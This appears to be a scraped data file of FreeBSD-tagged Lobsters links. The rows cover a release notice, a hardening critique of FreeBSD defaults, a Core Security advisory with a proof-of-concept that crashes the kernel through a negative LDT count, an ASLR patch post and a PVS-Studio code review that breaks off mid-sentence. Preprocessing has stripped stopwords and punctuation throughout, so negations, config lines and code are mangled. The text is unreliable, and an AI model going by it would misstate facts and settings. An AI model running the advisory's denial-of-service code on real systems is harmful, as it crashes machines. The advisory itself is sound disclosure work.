time announcement following ftp site freebsd available ftp ftpfreebsdorgpubfreebsdreleases freebsd also available via anonymous ftp mirror site following country argentina australia brazil bulgaria canada china czech republic denmark estonia finland france germany hong kong hungary iceland ireland japan korea lithuania netherlands new zealand poland portugal romania russia saudi arabia south africa slovak republic slovenia spain sweden taiwan thailand ukraine united kingdom trying central ftp site please check regional mirror first going ftp ftp yourdomain freebsdorgpubfreebsd additional mirror site labeled information freebsd mirror site found http instruction installing freebsd please see chapter freebsd handbook provides complete installation walkthrough user new freebsd found online http acknowledgment release engineering team includes scott long scottl freebsdorg release engineering ruslan ermilov ru freebsdorg creative director sniffy wonder cat warrm lap typing assistance max dancing cat early morning wakeups qa sammy tiny cat face lick qa begin pgp signature version gnupg freebsd end pgp signature ruslan ermilov ru freebsdorg freebsd committer information freebsdcurrent mailing list
560,Lobsters,freebsd,FreeBSD,"Meet ubuntuBSD, UNIX for Human Beings",http://news.softpedia.com/news/meet-ubuntubsd-unix-for-human-beings-501959.shtml,meet ubuntubsd unix human being,today great pleasure introducing new project saw light internet first time past weekend march meet ubuntubsd ubuntu debian gnukfreebsd freebsd debian lubuntu xfce desktop zfs file system sourceforge download beta ubuntubsd,today great pleasure introducing new project saw light internet first time past weekend march meet ubuntubsd ubuntubsd well asked first spotted project created jon boden hard figure case sure tell ubuntubsd promise bring power freebsd kernel ubuntu linux inspired debian gnukfreebsd ubuntubsd look like something never done usual curious see work took quick test drive please note moment writing article ubuntubsd project beta stage development based freebsd ubuntu wily werewolf iso image similar one ubuntu alternate isos providing user versatile debian textbased installer start mean ubuntubsd currently targeted advanced linux user want robust reliable server desktop operating system however installed ubuntu linux using ubuntu alternate iso image lubuntu flavor still provides installing ubuntubsd walk park entire installation process nt take minute modern computer xfce desktop zfs file system best part using freebsd kernel end using famous z file system zfs combined file system logical volume manager designed sun microsystems separate ufs partition boot expected zfs support completely integrated ubuntubsd operating system default ubuntubsd whatever want mean want use desktop o choosing lightweight highly customizable xfce desktop installation otherwise optin use ubuntubsd basic ubuntu server tool need know ubuntubsd currently hosted sourceforge website distributed installableonly iso image computer also download beta ubuntubsd codename escape systemd via website need aware fact still heavy development bug might occur installation
561,Lobsters,freebsd,FreeBSD,FreeBSD - a lesson in poor defaults,https://vez.mrsk.me/freebsd-defaults.txt,freebsd lesson poor default,freebsd lesson poor default blakkheim security page table content openssh modification hpnssh tcpwrappers patched back switched back reenabled opensshportable three version behind current one time mailer daemon sendmail back many sendmail update mention postfix opensmtpd msmtp firewall result might expect since port package pkg port poudriere cryptographic bypass mitmbased compromise support security history debian pkg equivalent fetched plaintext http mirror site immune ntp ntp ntimed constraint option sysctlconf stack clash periodic running root remember ssltls library actually longer mention security implication due openssl security bug month time reenable insecure option upstream disabled libressl swap swap permission rcconf devcpudata loaderconf cubic entropy pool hyperthreading nt even get one fix right compiletime option srcconf makeconf rebuild list old file custom config file stable read every commit message even actually connected build closing security team security charter month end meant year ever get fix update version xyz never get committed first place openly given nonaggressive particularly vulnerable revision author log message unsigned root plaintext four year multiple patch none rng broken month accidentally disabled removed without review parent company want long argument developer leaving project political commits got plan blakkheim addendum reverted,freebsd lesson poor default last updated blakkheim page list change make vanilla install freebsd security hardening change increase network performance make thing bit sane also included cover basic change sysadmin make running system could also considered commentary piece state security freebsd development ecosystem highlighting strong resistance change unwillingness replace old cruft modern alternative project security page say following freebsd take security seriously developer constantly working making operating system secure possible really true let find table content openssh modification freebsd history making interesting choice regard version openssh bundle base system often deliberately going upstream name retaining backward compatibility gain perceived performance improvement disabling ignoring security feature favor performance seems recurring theme see later belief quite poor decision made area primary example insisted maintaining hpnssh patchset enabling default quite long time might say well ok actually wrong patch openssh increased channel limit enough support crosscountry gigabit connection without slowdown year ago user mean hpn patch unnecessary complexity little benefit addition would frequently hold freebsd back updating version openssh hpn backporting manual refactoring patchset support tcpwrappers abandoned long ago openssh upstream freebsd still patched back enabled everyone true weak dsa host key switched back compatibility older client freebsd also reenabled insecure encryption cipher build disabled upstream backward compatibility apparently important security user nt deprecate insecure option bit bit somewhere ecosystem end situation like openssl pressure applied somewhere one part team one play case freebsd team trying increase risk made local change openssh build default config file left user vulnerable platform unaffected possibly incomplete list example pam issue two list freebsd modification code config file seen base system possibly outdatedunmaintained port version thankfully hinted fairly easy install openssh port freebsdisms removed opensshportable port hefty set option toggle bsmoff openbsm auditing docson build andor install documentation hpnoff hpnssh patch kerbgssapioff kerberosgssapi patch req gssapi ldnson sshfpldns support libediton command line editing via libedit nonecipheroff none cipher support pamon pluggable authentication module support tcpwrapperson tcpwrappers support xmssoff xmss key support experimental mitoff mit kerberos heimdaloff heimdal kerberos securityheimdal heimdalbaseoff heimdal kerberos base user project binary package repo portspoudriere user nt explicitly change build option get openssh set option besides modification mentioned two patch particular popular freebsd user threaded aesctr none cipher threaded aesctr name might imply introduces thread code openssh developer publicly said thread risky wo nt added largely obsoleted aesni modern cpu fact current default cipher even faster taking message authentication code mac consideration none cipher somewhat misfeature removing encryption bit keeping data integrity allows user accidentally shoot foot pretty easily tradeoff performance nt really worth either bottleneck one might experience lot mac actual encryption overhead recommend disabling port option majority user nt need extra risk nonstandard patch introduce usrlocaletcsshsshdconfig file would recommend enabling modern crypto however cryptography complicated important topic would better served research algorithm come conclusion instead taking word thankfully upstream openssh care security continues remove old broken algorithm time go freebsd ca nt keep patching back maintaining backports simply much work nt meant entire ssh tutorial consider changing default port something want le spam log set public key disable password authentication usual stuff following config line revert freebsd local change introduce new risk challengeresponseauthentication usepam versionaddendum none prevent o information leaked sshd another one freebsd enhancement base system port version addition improved security using port openssh allows upgrade newer version much faster waiting new release base system example freebsd comically limited upgrading base openssh release three version behind current one time local patch note may need configuration change using bundled openssh option nt easily fixable mailer daemon freebsd includes sendmail base system enables default like share quote one earliest security advisory freebsd ever published sendmail mail transfer agent rather poor reputation security related problem freebsd ship version sendmail known security problem fixed nt mean wo nt found future turn whoever wrote back nt wrong many came even sendmail reputation freebsd kept around left default user make matter worse freebsd sometimes import sendmail update mention included security fix might guess mean advisory published user nt get security fix long time think user agree old program mostly bother full mail server especially one full hole since nt base system ask something simple local mail delivery enough stop related service make startup slower like thing running background possible line needed disable sendmail rcconf section later actually run mail server better option like postfix opensmtpd need send mail third party provider like gmail msmtp another lightweight alternative three port firewall three firewall included freebsd ipfw pf ipfilter none enabled default nt know anything ipfilter know anyone us pretend nt exist ipfw native firewall written freebsd freebsd usual coding standard result might expect pf openbsd firewall ported openbsd freebsd one use mostly come preference since familiar pf use unfortunately version pf included freebsd nt synced upstream since want critical component o network device left largely unmaintained check documentation whichever firewall decide use proper configuration instruction port package manually compiling thing three main way install software freebsd pkg tool binary package built project infrastructure port system allowing custom option many application poudriere tool building binary package bulk pro con pkg pro fast installation little effort required pkg con little flexibility regard option enabled disabled must wait project rebuildupdate thing security update often left due carelessness committers mainly true quarterly branch default port pro many customization option control dependency install need update available soon committed svn rebuild actually need updated port con take long time compile thing especially web browser multiple unrelated tool involved portsnapsvn portmasterportupgrade etc poudriere pro build package one system distribute many others still retains pro using port little effort required easily scriptable poudriere con still take long time compile thing thing get pointlessly rebuilt wasting lot time french word hard spell one freebsd system using port might easiest option multiple system poudriere make whole process lot easier total beginner nt care option thing built using pkg prebuilt binary quickest easiest option however security concern arise starter port system pkg lot thing root needed brought member port security team simply shrugged portsnap check snapshot fetch public key figured nothing worry question credibility sometimes true verifying file fetch would indeed good thing done dangerous operation nt data integrity check done late process giving plenty opportunity exploit tool called shell script running root taking untrusted input internet portsnap freebsdupdate serious design flaw could easily fixed perhaps utmost confidence tool bugfree try bit realistic turn right detailed extensively short version basically anyone using tool remotely compromised root level tool also run gunzip root data verified seems freebsd nt learned much since catastrophe similar issue brought mailing list though nothing ever came discussion either bug poor design choice left freebsd user vulnerable rootlevel compromise every time update system port tree think despite issue brought list april despite public exploit published may despite multiple big news site picking story left unfixed october freebsd security team left user vulnerable exploit long time back port pkg similar design flaw probably never fixed risk involved letting root go internet download file summary happens process building port fetch update port tree fetch software source code verify checksum file extract source tarball run configure script apply local patch build application create package built file install package system desired many actually need done root last one many done root default freebsd pid username thr pri nice size re state c time wcpu command root wait cc root wait make root zio cc maybe people nt realize risk actually building third party tool root privilege read every line configure script seen configure script running ping phone home kind weird stuff since everything run root take one malicious command tucked away build script somewhere completely compromise host use port default configuration made even worse negligence port maintainer case cryptographic bypass mitmbased compromise certain port surprisingly freebsd support package build nonroot user though told staging integrated port default still everything root work around issue tried manually introducing privsep build process machine port user need chown directory make writable user many change needed etcmakeconf file appears really designed done way call experiment solution needed like thing designed troublesome secure possible one ever try hey work intended poudriere tool us freebsd jail system filesystem isolation process little safer using port regard however distfiles still fetched root portsnapsvn command run root etc host system way jailed task trivial isolate different user poudriere nt operation poudriere unprivileged user compiling change took year pressure make pkg tool also run everything root fetching verifying package untarring registering installation pid username thr pri nice size re state c time wcpu command root select pkg comparison look security history debian pkg equivalent package signed defense gotten user really demonstrates lack understanding actually going run pkg command freebsd binary package also fetched plaintext http default even though main mirror site support http library used download package port distfiles libfetch certainly immune serious security problem let trivial bug turn privilege escalation nightmare actually freebsd guess escalation since already running root whole time ntp many freebsd security advisory related ntp daemon included base system known reference implementation another possibly incomplete list expect see many time go also contain multiple vulnerability ntpd code written mainly time geek scientist instead people actually run networkfacing service obviously want keep clock synced correct time luckily number alternative ntp daemon choose one freebsd committer working ntp implementation called ntimed nt tried ca nt worse freebsd ship though another option one use called openntpd based name see guess originates simple usrlocaletcntpconf may look something like constraint http wwwfreebsdorg server poolntporg note constraint option available freebsd default package want additional security benefit need use libressl instead openssl detail later much like firewall section personal preference tradeoff openntpd excellent security track record simple config syntax ntimed likely give better microsecond precision whichever choose nt use base one sysctlconf etcsysctlconf file great place tweak lot thing example mainly fix poor default related network performance security documentation nt great came enable need igmp multicast netinettcpccalgorithmcubic note blackhole option sometimes make debugging network issue difficult two option break poudriere compiling privsep following description taken sysctl output minor grammar fix hwkbdkeymaprestrictchange restrict ability change keymap enable address map randomization enable address map randomization assume sbrk used assume sbrk used enable address map randomization pie binary enable address map randomization pie binary kernipcshmusephys enabledisable locking shared memory page core kernrandompid random pid modulus freebsd randomize process id default netineticmpdropredirect ignore icmp redirects netinetipcheckinterface verify packet arrives correct interface netinetipprocessoptions enable ip option processing l srr rr t netinetiprandomid assign random ipid value freebsd randomize ip id default netinetipredirect enable sending ip redirects netinettcpblackhole send rst segment closed port netinettcpccalgorithm default tcp congestion control algorithm freebsd us newreno default severely outdated often result poor upload speed lfns netinettcpdropsynfin drop tcp packet synfin set netinettcpicmpmayrst certain icmp unreachable message may abort connection synsent netinetudpblackhole send port unreachables refused connects securitybsdhardlinkcheckgid unprivileged process create hard link file owned group securitybsdhardlinkcheckuid unprivileged process create hard link file owned user securitybsdseeothergids unprivileged process may see subjectsobjects different real gid securitybsdseeotheruids unprivileged process may see subjectsobjects different real uid securitybsdstackguardpage insert stack guard page ahead growable segment also see stack clash report poorly implemented securitybsdunprivilegedprocdebug unprivileged process may use process debugging facility securitybsdunprivilegedreadmsgbuf unprivileged process may read kernel message buffer seem like painfully obvious choice require every user much research configuration make system bit sane periodic many useless thing even potentially security risk running background default lot poorly documented maybe documented configure system send email expect extremely long daily report nothing useful sent root inbox nt need disk thrashed every night someone thought good idea enable every check sun freebsd similar window way look etcdefaultsperiodicconf file show script base system run default periodic called cron standard configuration periodic script seen either etcperiodic base daemon usrlocaletcperiodic port install port package may also add new periodic script even enable default something aware reference etcperiodicconf use disable much background activity dailybackupaliasesenable dailybackuppkgenable dailybackuppkgdbenable dailycleanpreserveenable dailycleanrwhoenable dailystatuspkgchangesenable dailystatussecuritychkmountsenable dailystatussecuritychkportsumenable dailystatussecuritychksetuidenable dailystatussecurityenable dailystatussecurityipfdeniedenable dailystatussecurityipfwdeniedenable dailystatussecurityneggrppermenable dailystatussecuritypfdeniedenable dailystatussecuritypkgchecksumenable dailystatussecuritypkgauditenable monthlyaccountingenable monthlystatisticsenable monthlystatisticsreportdevices monthlystatussecurityenable weeklylocateenable weeklynoidenable weeklystatuspkgenable weeklystatuspkgenable weeklystatussecurityenable weeklywhatisenable list may everyone want ok since need dictate script want running suggest disabling one particular dailystatussecuritypkgauditenable certainly nt want pkg running root remember going internet every night fetch list vulnerable port thought safe alerted vulnerability installed package nice simply need operation root dangerous combination laziness poor software design quite prevalent port committers often nt even update vulnerability database new public flaw found provides little benefit anyway ssltls library openssl included freebsd base system two main issue first supported version freebsd included unsupported version openssl requiring security team backport fix realistically leave unfixed forever second openssl many problem probably heard like lack code review unwillingness remove support arcane system one used many year know maybe openssl freebsd perfect fit regard long list right actually longer point freebsd started importing openssl security update mention security implication mean proper advisory never published release user never got fix upgraded new o version similar ntp list would expect many come also note many advisory contain multiple vulnerability freebsd release even delayed due openssl security bug one occasion freebsd leaf version vulnerable month time dealing highly insecure software maintained largelyinactive security team obvious recipe disaster make thing better freebsd ssl library choice essentially come three use openssl base link port wait updated security hole found made even worse fact freebsd like reenable insecure option upstream disabled use newer version openssl port base system utility still linked base one least easily turn insecure option way use alternative library port base system utility still linked base one recommendation use libressl port avoid base system utility interfacing ssltls possible relevant etcmakeconf line poudriere equivalent switch defaultversionsssllibressldevel libressl older stable version time shown switching libressl cut number vulnerability deal considerable margin well average severity contrast freebsd bundled version openssl also actually get security fix new version released assuming port kept date swap think swap always encrypted freebsd developer disagree surprising much private data memory get written disk someone know run hexdump swap partition found pgp private key plain view ssh key might passwordprotected disk could end swap sooner later password needed one see problem example etcfstab line standard swap partition device mountpoint fstype option dump pas none swap sw thing swap automatically encrypted device mountpoint fstype option dump pas none swap sw need add eli device name onetime key generated destroyed swap unmounted swap content unrecoverable unencrypted swap previously consider using dd write random data encrypting easy everyone risk permission standard unix stuff run user umask chmod home directory nt let user read firewall rule important config file prevents lot thing leaked compromised process read access filesystem think jail container culture made lot people really lazy kind thing still many important file directory worldreadable default freebsd rcconf addition item gone already nt know freebsd nt clear tmp startup expected behavior going remote logging prefer syslogd nt open socket note microcodeupdateenable line load updated intelamd cpu microcode security fix work devcpudata packageport installed relevant line etcrcconf file cleartmpenable yes microcodeupdateenable yes ntpdenable openntpdenable yes opensshenable yes pfenable yes sendmailenable sendmailmspqueueenable sendmailoutboundenable sendmailsubmitenable sshdenable syslogdflags s make sure understand difference sshdenable opensshenable remote machine loaderconf bootloaderconf file similar etcsysctlconf value loaded much earlier probably one already short list thing recommend adding cccubicload yes kernrandomfortunaminpoolsize machdephyperthreadingallowed hwspecstorebypassdisable hwmdsdisable cubic tcp congestion control algorithm requires kernel module loaded wo nt work default newreno algorithm old suitable modern network increase minimum entropy pool size necessary cause reseed default bit low taste intel hyperthreading technology also known smt simultaneous multithreading proven insecure disabled finally freebsd thought would good idea fix number cpu vulnerability leave fix turned default performance reason proactive user enables manually protect well might even good enough either since nt even get one fix right nevertheless recommend enabling affected cpu compiletime option nondefault security feature freebsd require compile kernel userland andor third party package modified option using projectprovided binary leave without protection option defined etcsrcconf etcmakeconf file man page srcconf primarily includingexcluding feature base o custom build makeconf build option helpful never used either one recommend following etcsrcconf line security improvement withoutfreebsdupdateyes withoutntpyes withoutportsnapyes withoutsendmailyes withoutsourcelessyes withouttcpwrappersyes withoutkerberosyes exclude explicitly need kerberos withoutpamsupportyes exclude explicifly need pam withbindnowyes withretpolineyes withkernelretpolineyes withpieyes many withwithout knob exist allowing rip part o nt need waste time recompiling every update give man page read come combination mine line long rebuild o modification sure run make target also delete leftover file like deleteold deleteoldlibs freebsd developer seem trouble keeping list old file date even user submit bug report work likely still leftover file make target actually clean finding removing must done manually create installation medium custom build reinstall onesizefitsall list setting example makeconf provided however two quick tip modulesoverride setting let exclude kernel module except one explicitly set saving time build tweaking cflags cxxflags gentoostyle may tempting leave one reader decide kernel option defined usrsrcsys confgeneric config file going sourceonly route compile missing security option also recommend copyinggeneric new custom config file example stripping thing nt need le running code provides reduced attack surface nt enable nt need good general policy additionally release branch get security fix backported properly like freebsd documentation would lead believe recommend using stable branch going rebuild modified hardened version o usually provide majority security fix never backported always even security fix land current never get merged back mfced release stable meaning anyone want public fix either read every commit message manually merge fix back source tree rebuilding run bleeding edge current branch get decide aware sometimes even good enough sometimes security fix committed tree actually connected build leaving everyone vulnerable month third party package option defined depend whether using port system directly poudriere bulk building tool port read etcmakeconf poudriere read usrlocaletcpoudrieredmakeconf desired duplicating withbindnow withpie withretpoline option package build accomplished line cflags mretpoline cflags fpie cxxflags mretpoline cxxflags fpie ldflags pie ldflags wl zretpolineplt ldflags wl znow since default option thus people test port fail compile failure reported port maintainer andor upstream developer add exception failing port following syntax used empty curdir langpython cflags fpie cxxflags fpie ldflags pie endif pie option removed first block placed statement exclude python port built flag python port may may actually need example closing sharing page hoped start discussion changing default setting freebsd think many decided long ago one think anymore perhaps important though mindset many freebsd developer one blatantly disregard security favor performance appeasing enterprise consumer must change anything else improve user like way though resistance security team phase legacy option make wonder called backwards compatibility team instead freebsd security officer mission protect freebsd user community keeping community informed bug exploit popular attack risk acting liaison behalf freebsd project external organization regarding sensitive nonpublic security issue promoting distribution information needed safely run freebsd system system administration programming tip security charter page view security team today seems exact opposite number task really like see thing reevaluated safety userbase fix problem rather shipping poor default user must clean case point section security man page detail securityrelated sysctls disabled default fix give user sane foundation begin said freebsd history security problem go far beyond poor default setting o severe lack transparency security team disclosure policy leaf user vulnerable attack long period time many known vulnerability left unpatched freebsd month end video oh say month meant year seems even freebsd developer realizing much circus even public exploit news site social medium freebsd security team often take sweet time fixing especially release branch often see security fix merged current simply left sometimes get lucky merged back stable increasingly rare main release branch one user run get muchneeded patch timely manner ever extra legwork maintaining many supported branch mean none ever get developer full attention bound run problem one branch fixed never happened another similar note increasingly common security fix go without mention security advisory published nothing use affected release simply get fix even told exists problem even worse port innocentsounding update version xyz commit message often hide substantial security fix nt get merged back quarterly branch default new installs maybe le issue security fix never get committed first place freebsd porter openly given maintaining vulnerability database meaning ca nt relied either freebsd severely lacking modern exploit mitigation technique getting basic aslr development branch disabled default course comparison openbsd introduced aslr linux window freebsd developer posted experimental early version aslr patch explains intentionally weak sorry mean nonaggressive default weakened aslr finally available user found software base system nt work anymore due bug certain assumption code disabling aslr starting ntpd manually workaround viable long run writes one affected user mailing list author aslr implementation replied message asking think describes freebsd overall attitude towards security quite well building upon many modern mitigation technique nt seem planned far tell far exploit mitigation go freebsd still stuck stone age video networkfacing service running freebsd particularly vulnerable attack result even local system comparatively vulnerable thanks everpresent performance first security last mindset revision author mckusick log message add new untrusted option mount command purpose notify kernel file system untrusted use extensive check filesystem metadata using option intended used mounting file system untrusted medium usb memory stick externallyprovided medium see obvious logic error commit code freebsd malloc jemalloc forgiving buggyhostile code compared something like otto malloc freebsd net installer fetch unsigned o file root plaintext ftphttp protocol took freebsd four year switch algorithm known broken even multiple patch presented fix often little review none crypto code security fix general even resulted catastrophic failure like rng broken month without anyone noticing time high quality entropy source accidentally disabled time kernel code preventing shell injection removed without review approval change seems anyone svn access commit whatever want often parent company want without communication freebsd developer code review committhendiscuss culture usually lead long argument mailing list glaring security problem developer leaving project political commits could probably avoided review taken place first remember line beginning page freebsd take security seriously developer constantly working making operating system secure possible think safe say big lie freebsd foundation sometimes get million dollar yearly donation might wondering project ca nt get stuff right well seems got plan use money commenting article one freebsd developer say tried getting default changed project committer reaction conditioned expect know safe change even though ton user make change best practice port exprun may happen result seem ignored nobody else care provide extremely detailed performance feel like expected produce thesis topic finally downstream vendor kind gave getting change made conclusion ca nt recommend freebsd task security matter o secure linux box developer seem interested keeping corporate donor happy making good operating system thanks reading follow twitter blakkheim send feedback addendum five month document published freebsd disabled dsa hostkey server support bundled version openssh done year upstream openssh removed five month document published freebsd introduced minimal privilege separation pkg tool though reverted one day committed pkg privsep revisited two month later reverted december trouble keeping track flipflops mean still going internet root ten month document published freebsd disabled hpn patchset bundled version openssh one year document published freebsd enabled sysctl recommendation default development branch installer reverted one month later due freebsd release schedule would nt reached majority user quite time anyway user upgrade release rather reinstalling would nt seen option introduced multiple developer mailing list favor reverting change development community like hard see little progress ever made nearly two year document published freebsd disabled hpn patchset port version openssh removal hpn base port appears due build failure rather security consideration nearly two year document published freebsd switched poudriere tool default build user root unprivileged one left distfile fetching operation others running root four year document published freebsd stopped making root directory worldreadable new installation
562,Lobsters,freebsd,FreeBSD,FreeBSD Kernel amd64_set_ldt Heap Overflow,http://www.coresecurity.com/advisories/freebsd-kernel-amd64setldt-heap-overflow,freebsd kernel heap overflow,advisory information title advisory id advisory url date published date last update vendor contacted release mode vulnerability information class impact remotely exploitable locally exploitable cve name vulnerability description vulnerable package nonvulnerable package vendor information solution workarounds credit technical description proof concept code freebsd integer signedness vulnerability proof concept report timeline reference http wwwfreebsdorgcgimancgi http viewmarkup http viewmarkup corelabs wwwcoresecuritycomcorelabs core security http wwwcoresecuritycom disclaimer http,advisory information title freebsd kernel heap overflow advisory id advisory url date published date last update vendor contacted freebsd release mode coordinated release vulnerability information class unsigned signed conversion error impact denial service remotely exploitable locally exploitable yes cve name vulnerability description freebsd advanced computer operating system used power modern server desktop embedded platform large community continually developed thirty year advanced networking security storage feature made freebsd platform choice many busiest web site pervasive embedded networking storage device integer signedness error found function freebsd kernel code defined file implement system call version o integer signedness issue ultimately lead heap overflow kernel allowing local unprivileged attacker crash system vulnerable package freebsd version may affected checked nonvulnerable package vendor information solution workarounds freebsd team released patch reported vulnerability upgrade freebsd credit vulnerability discovered researched francisco falcon core exploit writer team publication advisory coordinated joaquin rodriguez varela core advisory team technical description proof concept code freebsd integer signedness vulnerability freebsd expose architecturedependent system call intel version system call used manage perprocess local descriptor table ldt entry version freebsd still expose system call application running version o architecturespecific system call handled freebsd kernel sysarch function defined file int sysarch td uap struct thread td register struct sysarchargs uap uap op uap op return sysarchldt td uap uiouserspace see code snippet system call invoked either sysarchldt function called following code excerpt show part sysarchldt function charge handling syscall int sysarchldt struct thread td struct sysarchargs uap int uapspace struct largs la struct usersegmentdescriptor lp switch uap op case largs descs null largs num maxldtsegment return einval setpcbflags td tdpcb pcbfulliret largs descs null lp malloc largs num sizeof struct usersegmentdescriptor mtemp mwaitok error copyin largs descs lp largs num sizeof struct usersegmentdescriptor error error td largs lp free lp mtemp else error td largs null break largs variable seen pointer structure defined follows file struct unsigned int start union descriptor descs unsigned int num note field structure fully usercontrolled match argument specified user called user mode int int startsel union descriptor descs int numsels sysarchldt snippet see call user mode specifying null pointer second argument largs descs end calling function passing largs variable second argument null pointer third argument prototype function called int struct thread td struct uap struct usersegmentdescriptor descs vulnerable function since called third argument descs pointer set null following code path executed remember every field structure pointed uap pointer fully controlled user mode int td uap descs struct thread td struct uap struct usersegmentdescriptor descs int largestld descs null free descriptor uap start uap num uap num maxldtsegment uap num return einval pldt mdp mdldt null uap start maxldtsegment return largestld uap start uap num largestld maxldtsegment largestld maxldtsegment largestld uap start mtxlock dtlock bzero struct usersegmentdescriptor pldt ldtbase uap start sizeof struct usersegmentdescriptor mtxunlock dtlock return two statement line perform sanity check uap start uap num avoided setting uap num value different next check line cause function exit early mdp mdldt pointer null uap start greater equal maxldtsegment mdp mdldt holding nonnull value achieved adding initial entry process ldt triggering bug like struct segmentdescriptor desc sdtmemrw selupl ldtautoalloc union descriptor desc passing check reach vulnerable code line largestld uap start uap num largestld maxldtsegment largestld maxldtsegment largestld uap start note largestld signed int hold sum uap start uap num code line try ensure largestld greater maxldtsegment however largestld signed integer holding value fully controlled user mode perform signed comparison bypassed setting uap num negative number signedness error ultimately lead heap overflow freebsd kernel bzero function later called huge value len parameter bzero struct usersegmentdescriptor pldt ldtbase uap start sizeof struct usersegmentdescriptor proof concept following proofofconcept code reproduces vulnerability default freebsd installation running generic kernel clang include stdioh include unistdh include machinesegmentsh include machinesysarchh include sysexitsh include errh int main int argc char argv int re struct segmentdescriptor desc sdtmemrw selupl printf adding initial entry process ldt n re ldtautoalloc union descriptor desc re err exoserr ldtautoalloc printf returned index dn re printf triggering bug n re null report timeline core security sent initial notification freebsd freebsd confirmed reception email requested sent draft version advisory core security sent freebsd draft version advisory requested let u know finished reviewing advisory order coordinate publication date core security asked freebsd able review verify reported issue additionally requested estimated date releasing fixupdate freebsd informed u going release update middle following week core security asked freebsd specific date time going release update additionally requested cve identifier vulnerability considering registered cna freebsd informed u would probably release wednesday march assigned id advisory published reference http wwwfreebsdorgcgimancgi http viewmarkup http viewmarkup corelabs corelabs research center core security charged anticipating future need requirement information security technology conduct research several important area computer security including system vulnerability cyber attack planning simulation source code auditing cryptography result include problem formalization identification vulnerability novel solution prototype new technology corelabs regularly publishes security advisory technical paper project information shared software tool public use wwwcoresecuritycomcorelabs core security core security technology enables organization get ahead threat security test measurement solution continuously identify demonstrate realworld exposure critical asset customer gain real visibility security standing real validation security control real metric effectively secure organization core security software solution build decade trusted research leadingedge threat expertise company security consulting service corelabs engineering group core security reached web http wwwcoresecuritycom disclaimer content advisory copyright c core security c corelabs licensed creative common attribution noncommercial sharealike united state license http
563,Lobsters,freebsd,FreeBSD,Call for testing - ASLR patch,https://lists.freebsd.org/pipermail/freebsd-arch/2016-March/017719.html,call testing aslr patch,call testing aslr patch kostikbel gmailcom http http wwwkibkievuakibaslrpaxtestlog http wwwkibkievuakibaslrfedoralog information freebsdarch mailing list,call testing aslr patch konstantin belousov kostikbel gmailcom thu mar utc small straightforward yet featurepacked patch implement aslr freebsd available broader testing patch fetched http change randomization applied nonfixed mapping randomization mean base address mapping selected guaranteed amount entropy bit mapping requested superpage aligned randomization honour superpage attribute randomization done besteffort basis allocator fall back first fit strategy fragmentation prevents entropy injection trivial implement strong mode failure guarantee requested amount entropy result mapping request failure consider usable finetuned amount entropy injected right quantitive change change implementation current amount controlled aslrpagesrnd spoil coalescing optimization reduce page table fragmentation inherent aslr keep transient superpage promotion malloced memory locality implemented anonymous private mapping automatically grouped fragmentation kick initial location anon group range course randomized default mode keep sbrk area unpopulated mapping turned give much breathing bit small architecture funny considered small tied question following application hint mmap base address testing show ignoring hint affect function common application would expect demanding code could break default sbrk preserved mmap hint satisfied changed using kernelf aslrcaresbrk sysctl stack gap wx shared page randomization kaslr technique explicitely scope work paxtest result run patch applied aggresively tuned seen http wwwkibkievuakibaslrpaxtestlog comparision run fedora machine http wwwkibkievuakibaslrfedoralog aslr enabled perabi basis currently enabled native including compat abis expect test enable aslr well later procctl control aslr implemented provided userspace wrapper around syscall fact reasonable control needed perimage perprocess tradition put kernelread attribute extattrs binary still pondering part also explains nonwritten tool thanks oliver pinter shawn webb hardenedbsd project pursuing aslr freebsd although work based inspired effort thanks ed maste robert watson john baldwin alan cox discussion patch freebsd foundation directing information freebsdarch mailing list
564,Lobsters,freebsd,FreeBSD,FreeBSD gets Haswell graphics support in time for 11.0-RELEASE,https://svnweb.freebsd.org/changeset/base/296548,freebsd get haswell graphic support time,http,update match linux update brings initial support haswell gpus tested many user freebsd pcbsd hardenedbsd relnotes yes sponsored freebsd foundation differential revision http
565,Lobsters,freebsd,FreeBSD,PVS-Studio delved into the FreeBSD kernel,http://www.viva64.com/en/b/0377/,pvsstudio delved freebsd kernel,project freebsd checked coverity github methodology pvsstudio preprocessed file standalone surprising luck capyposte typo dangerous macro priority operation string nullterminal symbol operation memory pointer loop undefined behavior closer think detected miscelleneous conclusion pvsstudio,year ago checked linux core one discussed article time also got quite number request check freebsd finally decided take time project freebsd contemporary operating system server desktop embedded computer platform code gone thirty year continuous development improvement optimization proven system building intranet internet network server provides reliable network service efficient memory management despite fact freebsd regularly checked coverity great time checking project lot suspicious fragment found article provide fragment developer project may look full list contains around analyzer warning high severity humble opinion lot warning issued analyzer real bug hard determine critical developer system suppose could good ground discussion author project source code taken github branch master repository contains file two dozen assembly configuration different platform checked kernel compiled way make buildkernel kernconfmykernel methodology used static code analyzer pvsstudio version convenience set pcbsd wrote small utility c keep working environment compiler run building kernel acquired information used get preprocessed file analysis done pvsstudio method allowed quickly check project without study unfamiliar build system integrate analyzer top analysis preprocessed file allows indepth analysis code find sophisticated interesting error macro instance article provide several example kind linux kernel analyzed way mode also available window user standalone utility part pvsstudio distribution kit usually pvsstudio seamlessly integrates project number way integrate analyzer described documentation monitoring utility big advantage trying analyzer project unusual building system surprising luck first possible error found ran analyzer project even built kernel build interrupted linking error addressed file specified error saw following pay attention highlighted fragment tab character used formatting indentation two statement moved condition last statement actually refer condition always executed perhaps curly brace forgotten got comment copy analyzer warning analysis project make sure get compiled correctly report done warning must sortedexamined commented work done customer support team answer incoming mail also case customer send example false positive opinion turn real bug capyposte typo pvsstudio analyzer powerful tool static code analysis find bug various level severity first diagnostics simple created detect common bug related typo copypaste programming analysis review sort according error code article start type diagnostic rule identical subexpressions uintptrt b handler left right operator ipfwsockoptc static int comparesh const void const void b const struct ipfwsopthandler b const struct ipfwsopthandler b const struct ipfwsopthandler b uintptrt handler uintptrt b handler return else uintptrt b handler uintptrt b handler return return vivid example bad practice giving variable short uninformative name typo letter b part condition never return thus function return zero status always correctly identical subexpressions left right operator mpkthdrlen mpkthdrlen keyc int keyparse struct mbuf struct socket mflags mpkthdr mpkthdrlen mpkthdrlen goto senderror one field structure compared therefore result logical operation always false identical subexpressions left right operator pimnobusreset pimnobusreset sbptargc typedef enum pimextluns pimscanhilo pimnoremove pimnoinitiator pimnobusreset pimseqscan pimunmapped pimnoscan pimiscflag static void struct camsim sim union ccb ccb struct ccbpathinq cpi ccb cpi cpi versionnum xxx cpi hbainquiry pitagable cpi targetsprt pitprocessor pitdisconnect pittermio cpi transport xportspi cpi hbamisc pimnobusreset pimnobusreset example see variable pimnobusreset used bitwise operation nt affect result way likely constant different value meant used variable left unchanged statement equivalent else statement saintc global void sismpresprcvd agnull framehandle indirect mode call back success ossasmpcompletedcbt prequest completioncb agroot prequest 